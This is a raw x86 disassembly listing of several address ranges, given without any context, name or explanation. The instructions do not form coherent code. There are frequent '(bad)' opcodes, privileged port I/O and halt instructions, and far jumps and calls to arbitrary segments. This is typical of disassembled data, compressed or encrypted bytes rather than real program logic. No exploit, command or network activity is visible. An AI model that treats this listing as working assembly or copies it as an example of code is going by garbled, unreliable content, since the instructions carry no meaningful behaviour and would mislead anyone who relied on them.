  427ed3:	fdiv   QWORD PTR [eax+eiz*2]
  427ed6:	mov    ebx,0xeeb5c775
  427edb:	loop   0x427f25
  427edd:	jecxz  0x427eed
  427edf:	sub    al,0xc0
  427ee1:	pop    esi
  427ee2:	push   ebp
  427ee3:	push   eax
  427ee4:	fiadd  WORD PTR [ecx]
  427ee6:	xor    DWORD PTR [esi+0x5c],ebp
  427ee9:	xchg   ecx,eax
  427eea:	add    BYTE PTR [edi-0x78bb2602],bl
  427ef0:	mov    al,dh
  427ef2:	pop    es
  427ef3:	xchg   esp,eax
  427ef4:	adc    DWORD PTR [ebx-0x60],ebp
  427ef7:	adc    BYTE PTR [ebx+0x29f27e4f],al
  427efd:	in     eax,0xa2
  427eff:	xor    al,cl
  427f01:	dec    ebp
  427f02:	sub    ebx,esi
  427f04:	pop    ecx
  427f05:	mov    bl,0x7f
  427f07:	inc    ecx
  427f08:	addr16 xchg edi,eax
  427f0a:	ret    0x4fe4
  427f0d:	jb     0x427f6e
  427f0f:	push   esp
  427f10:	fidivr WORD PTR [ecx-0x5bec5bd2]
  427f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f17:	jno    0x427e9d
  427f19:	out    0x83,al
  427f1b:	(bad)  
  427f1c:	lods   al,BYTE PTR ds:[esi]
  427f1d:	repnz and al,0x7
  427f20:	mov    eax,ds:0xca0c6bf8
  427f25:	addr16 fstp st(6)
  427f28:	xor    bh,0xcf
  427f2b:	gs (bad) 
  427f2d:	sti    
  427f2e:	pop    es
  427f2f:	push   0xffffffe9
  427f31:	out    0x49,eax
  427f33:	dec    edx
  427f34:	xchg   edi,eax
  427f35:	shl    DWORD PTR [eax-0x4380a4a3],1
  427f3b:	lods   eax,DWORD PTR ds:[esi]
  427f3c:	enter  0x5dd2,0xe
  427f40:	cs aas 
  427f42:	repz dec esi
  427f44:	mov    ds:0xb4646d25,al
  427f49:	mov    eax,DWORD PTR [edx-0x7def74ea]
  427f4f:	hlt    
  427f50:	out    dx,al
  427f51:	or     DWORD PTR [esi+0x79],esi
  427f54:	add    DWORD PTR [ebp-0x4de1a593],edx
  427f5a:	call   0x38bc:0xd843f6a1
  427f61:	out    0xed,eax
  427f63:	push   ds
  427f64:	push   ds
  427f65:	daa    
  427f66:	div    DWORD PTR [ebx+0x49]
  427f69:	lods   eax,DWORD PTR ds:[esi]
  427f6a:	(bad)  
  427f6b:	pop    esp
  427f6c:	popa   
  427f6d:	stc    
  427f6e:	xchg   edi,eax
  427f6f:	mov    ds:0x480f6c70,eax
  427f74:	shl    DWORD PTR [edi+0x65],0x4c
  427f78:	cld    
  427f79:	inc    ecx
  427f7a:	jo     0x427f49
  427f7c:	mov    ah,0xc0
  427f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f7f:	jb     0x427f62
  427f81:	das    
  427f82:	popf   
  427f83:	jo     0x427f90
  427f85:	push   ecx
  427f86:	scas   eax,DWORD PTR es:[edi]
  427f87:	push   eax
  427f88:	icebp  
  427f89:	ficomp WORD PTR [esi-0x7987d1cb]
  427f8f:	pop    esi
  427f90:	scas   al,BYTE PTR es:[edi]
  427f91:	ds out dx,al
  427f93:	and    DWORD PTR [ebx+ebx*4-0x4d],eax
  427f97:	mov    edx,0x691a8c95
  427f9c:	push   edx
  427f9d:	xlat   BYTE PTR ds:[ebx]
  427f9e:	out    0x9f,al
  427fa0:	jnp    0x427f2c
  427fa2:	dec    esp
  427fa3:	sahf   
  427fa4:	ret    0xf25d
  427fa7:	cmp    eax,0x13568233
  427fac:	pop    esp
  427fad:	xor    al,0x1d
  427faf:	cdq    
  427fb0:	cmp    DWORD PTR [edi],ebp
  427fb2:	sub    eax,0x63a6f8de
  427fb7:	sbb    ecx,DWORD PTR [eax+0x2]
  427fba:	mov    esp,0x250ce696
  427fbf:	jne    0x427f85
  427fc1:	xchg   ecx,eax
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [edx+0x56],ebx
  428042:	sahf   
  428043:	mov    esi,0x1a994
  428048:	test   BYTE PTR [eax],0x0
  42804b:	add    dh,dh
  42804d:	loop   0x428022
  42804f:	pop    es
  428050:	(bad)  
  428051:	push   edx
  428052:	in     al,0x8b
  428054:	sbb    eax,0xcb9701c0
  428059:	inc    edi
  42805a:	cli    
  42805b:	mov    ch,0x57
  42805d:	stc    
  42805e:	jb     0x4280a1
  428060:	ficom  DWORD PTR [ebx+0x57859e1a]
  428066:	inc    ebp
  428067:	push   0xb
  428069:	shr    DWORD PTR [ebx],0x3f
  42806c:	xchg   ebp,eax
  42806d:	in     al,0xe4
  42806f:	ss pushf 
  428071:	push   esi
  428072:	cmc    
  428073:	pushf  
  428074:	lods   al,BYTE PTR ds:[esi]
  428075:	lahf   
  428076:	or     BYTE PTR [esi+0x13812649],0xa4
  42807d:	ds push ebp
  42807f:	je     0x4280e8
  428081:	xlat   BYTE PTR ds:[ebx]
  428082:	andnps xmm6,XMMWORD PTR [ecx-0x16663bfb]
  428089:	retf   0x11be
  42808c:	dec    edx
  42808d:	outs   dx,DWORD PTR ds:[esi]
  42808e:	cli    
  42808f:	je     0x42807a
  428091:	out    0x8e,al
  428093:	jne    0x4280f7
  428095:	xchg   esp,eax
  428096:	cdq    
  428097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428098:	pop    edx
  428099:	mov    eax,gs:0x5e243567
  42809f:	push   esi
  4280a0:	mov    esi,0x70eefd2a
  4280a5:	popf   
  4280a6:	mov    esi,0xd9c9a7ef
  4280ab:	cmp    eax,0x76e851e9
  4280b0:	dec    esp
  4280b1:	xchg   edi,eax
  4280b2:	(bad)  
  4280b3:	lock in eax,dx
  4280b5:	add    bh,BYTE PTR [esi+0x5e]
  4280b8:	and    ebp,edx
  4280ba:	xchg   edi,eax
  4280bb:	jno    0x4280ca
  4280bd:	fsubr  DWORD PTR [edi+0x16]
  4280c0:	shr    DWORD PTR [ecx-0x8],0xc0
  4280c4:	pop    edi
  4280c5:	fist   DWORD PTR [ecx-0x13186226]
  4280cb:	add    bh,ch
  4280cd:	loopne 0x4280fa
  4280cf:	cmc    
  4280d0:	fst    QWORD PTR [edi]
  4280d2:	xchg   esp,eax
  4280d3:	add    ah,al
  4280d5:	daa    
  4280d6:	dec    edx
  4280d7:	aas    
  4280d8:	repnz pushf 
  4280da:	mov    al,ds:0x875eab6e
  4280df:	adc    ebp,ebp
  4280e1:	data16 sti 
  4280e3:	daa    
  4280e4:	inc    ebx
  4280e5:	pop    esi
  4280e6:	add    eax,0x96fdcacd
  4280eb:	call   0xad45:0x178ed662
  4280f2:	pop    esi
  4280f3:	test   al,0xe0
  4280f5:	mov    dl,0x6a
  4280f7:	repnz mov esp,0xb9e435c9
  4280fd:	mov    bl,0xa2
  4280ff:	leave  
  428100:	add    DWORD PTR [esi+eax*8-0x20791332],edi
  428107:	mov    edx,0x3e22025a
  42810c:	(bad)  
  42810e:	mov    ds:0xbb3587ff,al
  428113:	popa   
  428114:	dec    ebx
  428115:	xor    BYTE PTR [edx],dh
  428117:	out    0xdd,al
  428119:	push   cs
  42811a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42811b:	or     bh,bh
  42811d:	jae    0x42812b
  42811f:	repnz cld 
  428121:	inc    edi
  428122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428123:	out    0x4,eax
  428125:	mov    BYTE PTR [ecx-0x56],dl
  428128:	pop    ebp
  428129:	ror    dl,cl
  42812b:	(bad)  
  42812c:	jmp    0x6d50:0x9a795391
  428133:	xchg   edi,eax
  428134:	push   edi
  428135:	test   eax,0xf5b64640
  42813a:	sbb    eax,0xa3059b94
  42813f:	xchg   BYTE PTR [esi+0x0],ch
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xdf3dbd4f
  4281c3:	sub    ecx,DWORD PTR [edx-0x9fffe56]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    BYTE PTR [ebp-0x2c4e4bf6],cl
  4281d1:	push   ds
  4281d2:	adc    eax,0x1723b315
  4281d7:	cmp    ah,BYTE PTR [edi]
  4281d9:	cmp    al,0xce
  4281db:	ror    DWORD PTR [esi+0x3b10e190],1
  4281e1:	sub    eax,0x137dcaf1
  4281e6:	push   ebx
  4281e7:	mov    ?,WORD PTR [ecx+ebp*8+0x4889e99e]
  4281ee:	jmp    0x76b13ee0
  4281f3:	mov    dl,0x79
  4281f5:	leave  
  4281f6:	and    DWORD PTR [edi+0x5649ed25],ecx
  4281fc:	mov    ds:0xd361e7c3,al
  428201:	sub    eax,0xecc94de6
  428206:	iret   
  428207:	sbb    BYTE PTR [ebx+ebp*8-0xb],cl
  42820b:	pop    ebx
  42820c:	add    esp,DWORD PTR [edi]
  42820e:	adc    DWORD PTR [ebx+esi*4],edi
  428211:	inc    ebp
  428212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428213:	inc    eax
  428214:	repz in eax,dx
  428216:	cmp    dl,BYTE PTR ss:[eax-0x6c]
  42821a:	sbb    cl,BYTE PTR [edi-0x116ff66c]
  428220:	mov    al,0xe5
  428222:	lods   al,BYTE PTR ds:[esi]
  428223:	lods   al,BYTE PTR ds:[esi]
  428224:	cwde   
  428225:	and    dl,BYTE PTR [ebp-0x6]
  428228:	and    al,0x77
  42822a:	pop    esp
  42822b:	jp     0x428215
  42822d:	loope  0x428254
  42822f:	mov    cl,0x9b
  428231:	or     al,0xff
  428233:	std    
  428234:	xor    DWORD PTR [esi-0x6f170d0b],0x5a
  42823b:	mov    al,0x12
  42823d:	mov    ebp,0x9b559fbf
  428242:	xor    esp,eax
  428244:	pop    ss
  428245:	sbb    DWORD PTR [edx+0x16],0x5d
  428249:	scas   al,BYTE PTR es:[edi]
  42824a:	in     eax,0xa5
  42824c:	popa   
  42824d:	jnp    0x42828e
  42824f:	add    dh,al
  428251:	addr16 (bad) 
  428253:	(bad)  
  428254:	out    dx,al
  428255:	out    0x2,al
  428257:	push   0x66
  428259:	sub    DWORD PTR ds:0xc0ebc7ad,0x5b
  428260:	ins    DWORD PTR es:[edi],dx
  428261:	or     eax,0xc7a4e8ba
  428266:	xor    BYTE PTR [eax+edi*1-0x20],bl
  42826a:	pop    ebp
  42826b:	frstor [edx]
  42826d:	inc    ecx
  42826e:	sbb    eax,DWORD PTR [ebx+0x7df7ccc0]
  428274:	xor    BYTE PTR [ecx-0x74397e6a],cl
  42827a:	sub    eax,0x7d279086
  42827f:	aas    
  428280:	lock js 0x4282e4
  428283:	cmp    DWORD PTR [ebx-0x74],esp
  428286:	jo     0x428245
  428288:	mov    BYTE PTR [ebp-0x51c94032],ch
  42828e:	retf   0x8fe5
  428291:	arpl   WORD PTR [ecx-0x6182de7d],dx
  428297:	cdq    
  428298:	sbb    al,BYTE PTR [edi+0xb]
  42829b:	cmc    
  42829c:	in     al,dx
  42829d:	call   0x2eef:0x2f7ec61
  4282a4:	out    dx,al
  4282a5:	push   0x3aceaee0
  4282aa:	pop    ecx
  4282ab:	test   BYTE PTR [ecx+0x6acb4394],ch
  4282b1:	push   ds
  4282b2:	lahf   
  4282b3:	add    DWORD PTR [ecx+0x2c953f31],ebp
  4282b9:	sub    ebx,DWORD PTR [ecx-0x280f6721]
  4282bf:	or     dl,bl
  4282c1:	inc    edx
	...
  428332:	add    BYTE PTR [eax],al
  428334:	adc    bl,BYTE PTR ds:0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	sti    
  428341:	out    dx,eax
  428342:	(bad)  
  428343:	pop    ebp
  428344:	sub    BYTE PTR [ebx+0xf60001],0x0
  42834b:	add    bh,dl
  42834d:	(bad)  [edi+0x48119537]
  428353:	test   al,0x71
  428355:	sbb    BYTE PTR [esi-0x2d40793c],0xe5
  42835c:	pop    edi
  42835d:	or     ecx,0xffffffb5
  428360:	stos   DWORD PTR es:[edi],eax
  428361:	jns    0x42835b
  428363:	cmp    ecx,ebp
  428365:	jle    0x428373
  428367:	inc    edi
  428368:	(bad)  
  428369:	dec    ebx
  42836a:	fstp   QWORD PTR [ebx]
  42836c:	or     ah,cl
  42836e:	cmp    BYTE PTR [ebx],al
  428370:	or     al,0x5d
  428372:	scas   eax,DWORD PTR es:[edi]
  428373:	std    
  428374:	pushf  
  428375:	repz into 
  428377:	lock test al,0xcc
  42837a:	mov    edi,0xe11b7643
  42837f:	xor    DWORD PTR [esi+eiz*1-0x5f],esp
  428383:	inc    eax
  428384:	sbb    edx,DWORD PTR [esi+0x75]
  428387:	cld    
  428388:	push   eax
  428389:	dec    ebp
  42838a:	cmp    al,0x76
  42838c:	nop
  42838d:	mov    dh,0x2e
  42838f:	loope  0x428392
  428391:	xchg   DWORD PTR [ebx-0x6d42ee8b],ecx
  428397:	and    ch,BYTE PTR ds:0xe3aa1d4f
  42839d:	sahf   
  42839e:	inc    edx
  42839f:	nop
  4283a0:	mov    eax,0x6639e571
  4283a5:	fs add eax,0xdfb7351
  4283ab:	call   FWORD PTR ds:0xc6dc6873
  4283b1:	(bad)  
  4283b2:	scas   al,BYTE PTR es:[edi]
  4283b3:	leave  
  4283b4:	mov    bl,0x21
  4283b6:	out    0x62,eax
  4283b8:	add    al,0x8e
  4283ba:	shr    bh,1
  4283bc:	aam    0xd2
  4283be:	add    eax,esp
  4283c0:	mov    ch,0xde
  4283c2:	daa    
  4283c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283c4:	scas   al,BYTE PTR es:[edi]
  4283c5:	pop    ecx
  4283c6:	nop
  4283c7:	xor    eax,0xc008d68
  4283cc:	pop    edx
  4283cd:	in     eax,0xcf
  4283cf:	cmp    BYTE PTR [esi],al
  4283d1:	xor    eax,0x8c52a8c8
  4283d6:	or     edi,DWORD PTR [esi+0x19]
  4283d9:	or     ch,BYTE PTR [eax-0x76]
  4283dc:	adc    ebx,DWORD PTR [ecx-0x9]
  4283df:	leave  
  4283e0:	imul   BYTE PTR [edi+0x5b230ee8]
  4283e6:	popf   
  4283e7:	xchg   ebx,eax
  4283e8:	stos   BYTE PTR es:[edi],al
  4283e9:	xchg   esp,eax
  4283ea:	cld    
  4283eb:	ins    BYTE PTR es:[edi],dx
  4283ec:	mov    al,ds:0xd324cffc
  4283f1:	nop
  4283f2:	cld    
  4283f3:	and    edi,esi
  4283f5:	push   edi
  4283f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283f7:	adc    BYTE PTR [esp+esi*4-0x44],cl
  4283fb:	test   al,0x64
  4283fd:	mov    edx,0xc3cfe70e
  428402:	pop    ds
  428403:	test   BYTE PTR [eax-0x60],0xb3
  428407:	jecxz  0x4283ed
  428409:	push   esi
  42840a:	mov    dh,0x51
  42840c:	sbb    cl,dl
  42840e:	mov    ds,esp
  428410:	push   es
  428411:	loop   0x42844f
  428413:	sbb    DWORD PTR [ebp+edi*8+0x10],ebp
  428417:	adc    al,0xaf
  428419:	mov    ds:0x1ef4b5ad,al
  42841e:	nop
  42841f:	ss cmc 
  428421:	imul   edx,DWORD PTR [eax+0x1f],0x15fb0b27
  428428:	inc    ebx
  428429:	xchg   DWORD PTR [ebp-0x16],edx
  42842c:	rcr    DWORD PTR [ebp+ebp*4-0xe],1
  428430:	lock xchg bx,ax
  428433:	out    0xb6,eax
  428435:	sbb    ecx,0x7836cdc5
  42843b:	aaa    
  42843c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843d:	leave  
  42843e:	jge    0x42844e
  428440:	sub    eax,0x27
	...
  4284b1:	add    BYTE PTR [eax],al
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0x6c6b3407]
  4284c1:	sti    
  4284c2:	neg    BYTE PTR [edi+0x76]
  4284c5:	lods   al,BYTE PTR ds:[esi]
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	test   BYTE PTR [eax],0x0
  4284cb:	add    BYTE PTR [ebp+0x2d202710],ah
  4284d1:	loope  0x428528
  4284d3:	mov    gs,WORD PTR [ebx-0x3d]
  4284d6:	add    BYTE PTR [edi+0x19a1d75c],bl
  4284dc:	cli    
  4284dd:	into   
  4284de:	cmp    al,0x68
  4284e0:	sbb    cl,al
  4284e2:	mov    WORD PTR [ebx+ecx*4-0x5afe5358],gs
  4284e9:	adc    DWORD PTR [edx],0xffffff89
  4284ec:	jno    0x42854f
  4284ee:	or     BYTE PTR [eax-0x766293b5],ch
  4284f4:	dec    edi
  4284f5:	sbb    dh,ah
  4284f7:	ja     0x42854f
  4284f9:	jge    0x428541
  4284fb:	fs aad 0x23
  4284fe:	es jl  0x428534
  428501:	frstor [edi+0x8d7f2fa]
  428507:	sbb    BYTE PTR [eax+0x20],al
  42850a:	push   ebx
  42850b:	pop    ecx
  42850c:	push   ecx
  42850d:	rol    al,1
  42850f:	les    esp,FWORD PTR [ebx-0x24]
  428512:	scas   eax,DWORD PTR es:[edi]
  428513:	or     eax,0x7a9b6db2
  428518:	retf   
  428519:	in     ax,dx
  42851b:	cdq    
  42851c:	popf   
  42851d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42851e:	jbe    0x4284f9
  428520:	xlat   BYTE PTR ds:[ebx]
  428521:	dec    ebp
  428522:	arpl   WORD PTR [eax+0x21],bx
  428525:	push   0xfffffffd
  428527:	pop    ebx
  428528:	not    ecx
  42852a:	es js  0x42853d
  42852d:	bnd lock jne 0x428502
  428531:	out    dx,eax
  428532:	and    bl,dh
  428534:	js     0x4285a1
  428536:	xor    cl,ch
  428538:	cmp    DWORD PTR [ebx-0x6aac53e5],ebp
  42853e:	in     eax,0x9
  428540:	push   0x4890fd6f
  428545:	adc    DWORD PTR [ecx],edi
  428547:	imul   esp,DWORD PTR [edx],0xffffffb8
  42854a:	sbb    al,0x81
  42854c:	or     DWORD PTR [ecx],ebp
  42854e:	pop    esp
  42854f:	inc    esi
  428550:	xchg   esi,eax
  428551:	cs repz dec esp
  428554:	rcl    BYTE PTR fs:[eax+edi*8-0x2e62ed4e],1
  42855c:	xchg   edx,eax
  42855d:	xlat   BYTE PTR ds:[ebx]
  42855e:	mov    edi,0x6f522f58
  428563:	into   
  428564:	inc    ecx
  428565:	(bad)  
  428568:	ins    BYTE PTR es:[edi],dx
  428569:	add    DWORD PTR [eax],edx
  42856b:	xchg   esi,eax
  42856c:	push   eax
  42856d:	jo     0x4285e6
  42856f:	icebp  
  428570:	mov    eax,ds:0xae6fd32f
  428575:	rol    ecx,0x41
  428578:	pop    ecx
  428579:	aaa    
  42857a:	jnp    0x4285ae
  42857c:	adc    eax,0x50b110a0
  428581:	bound  esp,QWORD PTR [ebp-0x2b6cc1d3]
  428587:	fucomp st(2)
  428589:	jl     0x428596
  42858b:	cmp    eax,0x57480021
  428590:	pop    edx
  428591:	test   al,al
  428593:	shr    DWORD PTR [ebx-0x65],1
  428596:	push   edx
  428597:	sub    bl,BYTE PTR [ebx]
  428599:	shr    BYTE PTR [ecx],1
  42859b:	loop   0x42857a
  42859d:	(bad)
  4285a0:	jo     0x4285c1
  4285a2:	jge    0x4285d6
  4285a4:	clc    
  4285a5:	(bad)  
  4285a6:	enter  0x8a3f,0x39
  4285aa:	les    esp,FWORD PTR [ebp+ebx*8+0x54ea0c32]
  4285b1:	push   ss
  4285b2:	jnp    0x4285db
  4285b4:	mov    dl,0x1c
  4285b6:	sbb    BYTE PTR [eax+0x2b],0x40
  4285ba:	daa    
  4285bb:	jo     0x428555
  4285bd:	or     BYTE PTR [ecx-0x27],cl
  4285c0:	xchg   edi,eax
  4285c1:	aaa    
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	mov    ds:0x6c07242d,eax
  428645:	lods   eax,DWORD PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	test   BYTE PTR [eax],0x0
  42864b:	add    BYTE PTR [ebx],dl
  42864d:	dec    ecx
  42864e:	pop    eax
  42864f:	(bad)  [ebp+0x3fc195c0]
  428655:	rcr    DWORD PTR [ebx],0xad
  428658:	and    eax,0x273ff820
  42865d:	xchg   BYTE PTR [edx-0x10],bh
  428660:	cmp    bh,BYTE PTR [ebp+0x70021c73]
  428666:	or     eax,0x402fd92b
  42866b:	lea    esi,[ebp-0x6]
  42866e:	jne    0x42862e
  428670:	adc    edx,DWORD PTR fs:[esi+0x67a7dc5b]
  428677:	jp     0x42867f
  428679:	jp     0x428609
  42867b:	hlt    
  42867c:	fadd   st,st(1)
  42867e:	xor    dh,BYTE PTR ds:0x4c6e2b6
  428684:	rol    DWORD PTR [esi+0x6318aee],0xe4
  42868b:	xor    DWORD PTR [edx+0x19d2f9c],0x57
  428692:	mov    ebx,0xc14389c7
  428697:	imul   edx,edi,0xb7a327f6
  42869d:	pop    es
  42869e:	fisub  DWORD PTR [ebx+0x38249ff6]
  4286a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286a5:	ss jno 0x428714
  4286a8:	sub    al,0xc0
  4286aa:	mov    ecx,0x55a993f1
  4286af:	fs hlt 
  4286b1:	push   eax
  4286b2:	mov    esi,ebp
  4286b4:	(bad)  
  4286b5:	out    dx,al
  4286b6:	xor    ebp,edx
  4286b8:	(bad)  
  4286b9:	lahf   
  4286ba:	hlt    
  4286bb:	mov    BYTE PTR [edx-0x5a508f3b],dh
  4286c1:	data16 adc al,0x89
  4286c4:	mov    dh,0xb1
  4286c6:	push   esp
  4286c7:	ss addr16 call 0xece:0x558cc926
  4286d0:	or     eax,0x97c7aee9
  4286d5:	pop    ecx
  4286d6:	leave  
  4286d7:	sbb    DWORD PTR [ebp+0x64],ebp
  4286da:	xor    DWORD PTR [eax],esi
  4286dc:	add    BYTE PTR [ebx-0x68eff155],ah
  4286e2:	mov    dl,0x0
  4286e4:	dec    esi
  4286e5:	jl     0x42873c
  4286e7:	retf   
  4286e8:	pusha  
  4286e9:	neg    DWORD PTR [edi+0x37]
  4286ec:	mov    DWORD PTR [esi],esi
  4286ee:	retf   
  4286ef:	stos   BYTE PTR es:[edi],al
  4286f0:	mov    ah,BYTE PTR [esi]
  4286f2:	and    ah,bl
  4286f4:	cs inc ecx
  4286f6:	mov    dh,0xcc
  4286f8:	div    BYTE PTR [eax-0x70182e5]
  4286fe:	adc    eax,0x5be8fee7
  428703:	add    BYTE PTR [ebx+edi*4-0x1528c4fd],0xb9
  42870b:	pop    edx
  42870c:	sbb    bl,BYTE PTR [ebx-0x2c]
  42870f:	cmp    BYTE PTR [eax-0x29],dh
  428712:	add    BYTE PTR [esi+0x22],0xa7
  428716:	jb     0x428733
  428718:	sbb    DWORD PTR [esi+0x28abe7e1],edx
  42871e:	inc    esp
  42871f:	test   DWORD PTR [edi+0x49],ecx
  428722:	xchg   esi,eax
  428723:	shr    DWORD PTR ds:0x83705891,0x0
  42872a:	sub    eax,DWORD PTR [ecx]
  42872c:	shr    bh,cl
  42872e:	sbb    esi,DWORD PTR [edx+0x1c]
  428731:	xchg   esi,eax
  428732:	out    0x37,al
  428734:	xchg   ebx,eax
  428735:	jle    0x428716
  428737:	out    dx,eax
  428738:	jmp    0x9ebd:0x69e7ad87
  42873f:	es out dx,al
  428741:	pop    esi
	...
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0xc8b6299e
  4287c2:	add    BYTE PTR [ebx],0x62
  4287c5:	scas   al,BYTE PTR es:[edi]
  4287c6:	add    DWORD PTR [eax],eax
  4287c8:	test   BYTE PTR [eax],0x0
  4287cb:	add    bl,ah
  4287cd:	adc    WORD PTR [edi],si
  4287d0:	dec    BYTE PTR [eax]
  4287d2:	out    0x49,eax
  4287d4:	sahf   
  4287d5:	jmp    0xe1fe:0xce26f745
  4287dc:	test   BYTE PTR [edx-0x2512f256],al
  4287e2:	pusha  
  4287e3:	dec    ecx
  4287e4:	push   ebx
  4287e5:	add    al,0xc0
  4287e7:	mov    cl,0xcf
  4287e9:	jle    0x428770
  4287eb:	ds (bad) 
  4287ed:	stc    
  4287ee:	mov    ch,al
  4287f0:	pop    ds
  4287f1:	nop
  4287f2:	test   BYTE PTR [ebx],cl
  4287f4:	cmp    eax,0x8f3da49a
  4287f9:	push   eax
  4287fa:	retf   
  4287fb:	stos   DWORD PTR es:[edi],eax
  4287fc:	outs   dx,DWORD PTR ds:[esi]
  4287fd:	fcomp  DWORD PTR [ebx+0x7ee4f206]
  428803:	and    eax,0xa4accf60
  428808:	mov    bh,0x46
  42880a:	cmp    esi,DWORD PTR [eax]
  42880c:	or     al,0xd9
  42880e:	in     al,dx
  42880f:	shl    BYTE PTR [ecx+0x2b],cl
  428812:	pop    es
  428813:	sub    esp,DWORD PTR [esi]
  428815:	cmp    cl,BYTE PTR [esi+0x2d06eb85]
  42881b:	arpl   WORD PTR [esi],bp
  42881d:	cwde   
  42881e:	les    ebx,FWORD PTR [edi+esi*4-0x72]
  428822:	xor    bh,BYTE PTR [edi-0x1250429e]
  428828:	inc    edx
  428829:	repnz jmp 0x99d4:0x8ed6964c
  428831:	mov    dl,al
  428833:	jmp    0x3134:0x4dae1c25
  42883a:	div    DWORD PTR ds:0x99748220
  428840:	or     al,0xe3
  428842:	xchg   ebx,eax
  428843:	enter  0x2f4b,0x7a
  428847:	xchg   ebx,eax
  428848:	sbb    BYTE PTR [esi],al
  42884a:	in     al,0x6e
  42884c:	xor    BYTE PTR [ebx],cl
  42884e:	pop    ecx
  42884f:	mov    ebx,0x79c496ad
  428854:	lahf   
  428855:	xchg   BYTE PTR [eax-0x305e237],dh
  42885b:	cmp    DWORD PTR [edi-0x7a],ebp
  42885e:	lods   eax,DWORD PTR ds:[esi]
  42885f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428860:	jae    0x42888c
  428862:	mov    dl,0xf1
  428864:	stos   DWORD PTR es:[edi],eax
  428865:	xlat   BYTE PTR ds:[ebx]
  428866:	push   ebx
  428867:	cld    
  428868:	cwde   
  428869:	ins    WORD PTR es:[edi],dx
  42886b:	jne    0x4287f5
  42886d:	xor    al,0x6a
  42886f:	mov    dl,0xfe
  428871:	dec    edx
  428872:	xchg   ebx,eax
  428873:	push   ds
  428874:	cmovbe ecx,DWORD PTR [si+0x3cc6]
  42887a:	adc    ecx,DWORD PTR gs:[edi+0x27]
  42887e:	rcr    DWORD PTR [ebx],1
  428880:	push   eax
  428881:	jmp    0xa5608dcf
  428886:	es inc ebp
  428888:	or     esi,0xffffffe1
  42888b:	fcomi  st,st(7)
  42888d:	mov    dl,0xbd
  42888f:	shl    BYTE PTR [edx+esi*2+0x56652691],1
  428896:	push   edi
  428897:	jno    0x42889c
  428899:	and    DWORD PTR [ecx+0x123f6cc8],esp
  42889f:	sub    al,0x5b
  4288a1:	mov    dh,0x46
  4288a3:	jge    0x428885
  4288a5:	imul   eax,edx,0xc88cdd0c
  4288ab:	inc    BYTE PTR [edi+0x34]
  4288ae:	jo     0x42889f
  4288b0:	callw  0xb16f
  4288b4:	test   DWORD PTR [ebx-0x3c166540],esi
  4288ba:	cmp    ah,dl
  4288bc:	adc    bl,bl
  4288be:	add    eax,0x23c43
	...
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	fwait
  428941:	shr    DWORD PTR [ebx],cl
  428943:	outs   dx,BYTE PTR ds:[esi]
  428944:	pop    eax
  428945:	scas   eax,DWORD PTR es:[edi]
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    BYTE PTR [ecx+0x29],bl
  42894e:	int3   
  42894f:	lea    ebp,[edi+0x7a2479ea]
  428955:	out    0xde,eax
  428957:	xchg   ebp,eax
  428958:	stc    
  428959:	pusha  
  42895a:	int3   
  42895b:	push   ebx
  42895c:	jb     0x428972
  42895e:	and    BYTE PTR [ebx+0x3947f034],ch
  428964:	mov    eax,0x5ec037c0
  428969:	cmp    DWORD PTR [esi+eiz*2-0x4f],ebx
  42896d:	leave  
  42896e:	cmp    BYTE PTR [esi-0x2f],0xb5
  428972:	xchg   esi,eax
  428973:	sub    eax,DWORD PTR [eax-0x51]
  428976:	xchg   esp,eax
  428977:	xchg   esp,eax
  428978:	scas   eax,DWORD PTR es:[edi]
  428979:	dec    ebx
  42897a:	addr16 iret 
  42897c:	in     eax,0x3b
  42897e:	ja     0x428908
  428980:	dec    ecx
  428981:	dec    ebp
  428982:	adc    eax,0x6c05266d
  428987:	fwait
  428988:	or     BYTE PTR ds:0x5d7beb73,dl
  42898e:	ret    
  42898f:	mov    ebx,0x7ec4be50
  428994:	aam    0x2f
  428996:	pop    edi
  428997:	out    dx,al
  428998:	test   bl,bl
  42899a:	pop    ebp
  42899b:	push   esi
  42899c:	jnp    0x4289f5
  42899e:	aas    
  42899f:	or     edi,ecx
  4289a1:	mov    esp,0xa1a3fd33
  4289a6:	sbb    bh,dh
